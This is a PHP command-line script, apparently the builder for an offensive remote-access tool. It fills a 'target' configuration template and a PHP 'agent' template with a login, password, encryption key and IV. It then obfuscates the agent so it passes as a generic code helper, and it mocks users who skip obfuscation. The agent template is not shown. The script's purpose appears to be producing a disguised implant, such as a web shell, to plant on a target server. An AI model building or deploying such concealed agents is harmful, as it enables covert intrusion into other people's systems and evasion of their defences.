<?php
require 'obfuscator/src/Obfuscator.php';

$config_template = './templates/target.json';
$agent_template  = './templates/agent.php';
$output_dir      = './output/';

$options = getopt("l:p:k:i:");

if (!isset($options['l']) || !isset($options['p']) || !isset($options['k']) || !isset($options['i'])) {
    echo " [-] Invalid arguments.\n";
    exit(-1);
}

$login    = $options['l'];
$password = $options['p'];
$key      = $options['k'];
$iv       = $options['i'];

// Configuration file
$data = file_get_contents($config_template);
$data = str_replace("[KEY_HERE]", $key, $data);
$data = str_replace("[IV_HERE]", $iv, $data);
$data = str_replace("[LOGIN_HERE]", $login, $data);
$data = str_replace("[PASSWORD_HERE]", $password, $data);

$filename = null;
do {
    $line     = readline("Filename for the config file: ");
    $filename = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if (strlen($filename) == 0) {
        $filename = null;
    }
} while (is_null($filename));

file_put_contents($output_dir . $filename, $data);
echo " [+] Configuration file was generated properly, please make sure to replace [URL] with the target url.\n";

// Agent content
$data = file_get_contents($agent_template);
$data = str_replace("[KEY_HERE]", $key, $data);
$data = str_replace("[IV_HERE]", $iv, $data);
$data = str_replace("[LOGIN_HERE]", $login, $data);
$data = str_replace("[PASSWORD_HERE]", $password, $data);

$filename = null;
do {
    $line     = readline("Filename for the agent: ");
    $filename = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if (strlen($filename) == 0) {
        $filename = null;
    }
} while (is_null($filename));

file_put_contents($output_dir . $filename, $data);

$obfuscate = null;
do {
    $line   = readline("Do you want to obfuscate? [Y/n]: ");
    $answer = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if (strlen($answer) == 0 || strtolower($answer) == 'y' || strtolower($answer) == 'yes') {
        $obfuscate = true;
    } else if (strtolower($answer) == 'n' || strtolower($answer) == 'no') {
        $obfuscate = false;
    } else {
        $answer = null;
    }
} while (is_null($answer));

if (!$obfuscate) {
    echo " [!] Don't be stupid, obfuscate that agent!\n";
    exit(0);
}

unlink($output_dir . $filename);

$agent_data      = str_replace(array(
    '<?php',
    '<?',
    '?>'
), '', $data);
$obfuscated_data = new Obfuscator($agent_data, 'Class/Code helper');
file_put_contents($output_dir . $filename, '<?php ' . "\r\n" . $obfuscated_data);

echo " [+] Agent was obfuscated properly!\n\n";
echo " Open the output folder :)\n\n";
